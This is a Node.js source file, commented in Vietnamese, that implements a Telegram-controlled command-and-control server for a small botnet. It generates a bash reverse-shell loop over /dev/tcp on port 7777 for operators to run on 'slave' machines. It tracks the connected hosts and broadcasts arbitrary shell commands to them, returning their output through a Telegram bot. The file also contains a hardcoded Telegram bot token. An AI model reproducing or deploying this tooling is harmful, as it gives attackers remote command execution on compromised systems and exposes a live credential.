const net = require('net'), TelegramBot = require('node-telegram-bot-api');
const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc', chatIdAdmin = 7371969470;
const bot = new TelegramBot(token, { polling: true });
const danhSachBot = [];
let ketQuaTungBot = {}, lenhHienTai = '';

function capNhatIdBot() { danhSachBot.forEach((bot, index) => bot.id = index + 1); }

function ngatKetNoi(client) {
  const index = danhSachBot.findIndex(b => b.socket === client);
  if (index === -1) return;
  const bot = danhSachBot[index];
  danhSachBot.splice(index, 1);
  capNhatIdBot();
  try { client.destroy() } catch {}
  bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: Bot ${bot.id} - ${bot.ip}:${bot.port}`);
}

function guiLenhSlave() {
  require('https').get('https://api.ipify.org?format=json', res => {
    let duLieu = '';
    res.on('data', chunk => duLieu += chunk);
    res.on('end', () => {
      let ip;
      try { ip = JSON.parse(duLieu).ip } catch { ip = 'IP_CONG_KHAI_CUA_BAN' }
      const lenh = `while true; do exec 3<>/dev/tcp/${ip}/7777; while read -r c <&3; do [[ -z "$c" ]] && continue; o=$(bash -c "$c" 2>&1); echo "$o" >&3; done; sleep 2; done`;
      bot.sendMessage(chatIdAdmin, `🔥 Máy chủ sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${lenh}\n\`\`\``, { parse_mode: 'Markdown' });
    });
  }).on('error', () => guiLenhSlave());
}

const server = net.createServer(socket => {
  socket.setKeepAlive(true, 100);
  const ip = socket.remoteAddress.replace(/^.*:/,''), port = socket.remotePort;
  const botMoi = {socket, ip, port, uptime: 'chưa cập nhật', lastResponse: Date.now()};
  danhSachBot.push(botMoi);
  capNhatIdBot();
  bot.sendMessage(chatIdAdmin, `[+] Bot kết nối: Bot ${botMoi.id} - ${ip}:${port}`);

  let buffer = '';
  socket.on('data', duLieu => {
    buffer += duLieu.toString();
    const cacDong = buffer.split('\n');
    buffer = cacDong.pop();
    cacDong.forEach(dong => {
      if (!dong.trim()) return;
      botMoi.lastResponse = Date.now();
      if (dong.startsWith('up')) botMoi.uptime = dong.trim();
      else {
        if (!ketQuaTungBot[botMoi.id]) ketQuaTungBot[botMoi.id] = '';
        ketQuaTungBot[botMoi.id] += dong.trim() + '\n';
        if (Object.keys(ketQuaTungBot).length === danhSachBot.length) {
          let ketQua = `📋 Kết quả lệnh "${lenhHienTai}" từ ${danhSachBot.length} bot:\n\n`;
          for (let id in ketQuaTungBot) {
            const bot = danhSachBot.find(b => b.id == id);
            ketQua += `🖥 Bot ${id} [${bot.ip}]:\n\`\`\`\n${ketQuaTungBot[id]}\`\`\`\n`;
          }
          bot.sendMessage(chatIdAdmin, ketQua, {parse_mode:'Markdown'});
          ketQuaTungBot = {};
          lenhHienTai = '';
        }
      }
    });
  });

  socket.on('error', () => ngatKetNoi(socket));
  socket.on('close', () => ngatKetNoi(socket));
});

server.listen(7777, () => {
  console.log('[*] Máy chủ đang lắng nghe trên cổng 7777');
  guiLenhSlave();
});

setInterval(() => {
  const bayGio = Date.now();
  danhSachBot.forEach(bot => {
    if (bayGio - bot.lastResponse > 1000) ngatKetNoi(bot.socket);
    else try { bot.socket.write('uptime -p\n') } catch { ngatKetNoi(bot.socket) }
  });
}, 1000);

bot.onText(/^\/listbot$/, msg => {
  if (msg.chat.id !== chatIdAdmin) return;
  if (danhSachBot.length === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.');
  let text = `🤖 Có ${danhSachBot.length} bot đang kết nối:\n`;
  danhSachBot.forEach(bot => text += `Bot ${bot.id} - [${bot.ip}:${bot.port}] - Uptime: ${bot.uptime}\n`);
  bot.sendMessage(chatIdAdmin, text);
});

bot.onText(/^\/cmd (.+)/, (msg, match) => {
  if (msg.chat.id !== chatIdAdmin) return;
  const lenh = match[1].trim();
  if (!lenh) return bot.sendMessage(chatIdAdmin, '❌ Vui lòng nhập lệnh: `/cmd <lệnh>`', {parse_mode:'Markdown'});
  if (danhSachBot.length === 0) return bot.sendMessage(chatIdAdmin, '❌ Không có bot nào kết nối.');
  ketQuaTungBot = {};
  lenhHienTai = lenh;
  danhSachBot.forEach(bot => {
    try { bot.socket.write(lenh+'\n') } catch (e) { ngatKetNoi(bot.socket) }
  });
  bot.sendMessage(chatIdAdmin, `✅ Đã gửi lệnh đến ${danhSachBot.length} bot:\n\`${lenh}\``, {parse_mode:'Markdown'});
});
